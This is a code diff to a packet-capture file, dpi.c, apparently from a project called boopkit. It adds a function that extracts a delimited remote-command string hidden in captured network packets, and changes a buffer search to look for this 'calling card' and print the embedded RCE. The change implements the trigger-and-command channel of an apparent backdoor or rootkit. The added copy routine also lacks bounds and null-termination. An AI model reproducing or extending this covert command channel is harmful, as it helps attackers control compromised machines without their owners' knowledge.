@@ -21,8 +21,7 @@
 //
 // [dpi.c]
 
-#include <linux/types.h>
-#include <arpa/inet.h>
+#define _GNU_SOURCE
 #include <net/ethernet.h>
 #include <netinet/ip.h>
 #include <pcap.h>
@@ -34,6 +33,7 @@
 #include "dpi.h"
 #include "common.h"
 // clang-format on
+
 
 //--- [ Header ] ---
 
@@ -54,12 +54,33 @@ pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 
 //--- [ Header ] ---
 
+int rce_filter(char *raw, char *rce){
+  char *target = NULL;
+  char *start, *end;
+  start = strstr( raw, BOOPKIT_RCE_DELIMITER);
+  if (start){
+    start += strlen(BOOPKIT_RCE_DELIMITER);
+    end = strstr( start, BOOPKIT_RCE_DELIMITER);
+    if (end){
+      target = (char *)malloc(end - start + 1);
+      memcpy( target, start, end - start );
+      target[end - start] = '\0';
+    }
+  }
+  if (target){
+    strncpy(rce, target, strlen(target));
+    free( target );
+    return 1;
+  }
+  return 0;
+}
+
 void *xcap(void *v_dev_name) {
   char *dev_name = (char *)v_dev_name;
   boopprintf("  -> Starting xCap Interface  : %s\n", dev_name);
 
   // Initialize ring buffer
-  for (int ii = 0; ii <= XCAP_BUFFER_SIZE; ii++) {
+  for (int ii = 0; ii < XCAP_BUFFER_SIZE; ii++) {
     struct xcap_ip_packet *xpack = malloc(sizeof (struct xcap_ip_packet));
     xpack->packet = malloc(1); // Init to 1 byte to begin!
     xpack->iph = malloc(sizeof (struct ip));
@@ -208,7 +229,7 @@ int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
 int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
 
   // TODO Hang until the buffer fills up - I think we have a race
-  sleep(2);
+  sleep(1);
 
   boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
   xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
@@ -221,10 +242,18 @@ int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
       continue; // Ignore non captured packets in the buffer
     }
     unsigned char *packet = xpack->packet;
-//    printf("packet len: %d\n",xpack->header->len);
-//    printf("packet caplen: %d\n",xpack->header->caplen);
-    for (int j = 0; j < xpack->header->len; j++) {
-      printf("%c", packet[j]); // Print the DPI of the packet!
+    // First check if we find our calling card
+
+    // Use memmem() to set RCE directly
+    char *rce_sub;
+    rce_sub = memmem(packet, xpack->header->len, BOOPKIT_RCE_DELIMITER, strlen(BOOPKIT_RCE_DELIMITER));
+    if (rce_sub != NULL) {
+      int found;
+      found = rce_filter(rce_sub, rce);
+      if (found){
+        printf("RCE: %s\n", rce);
+        exit(1);
+      }
     }
   }
   printf("fin\n");
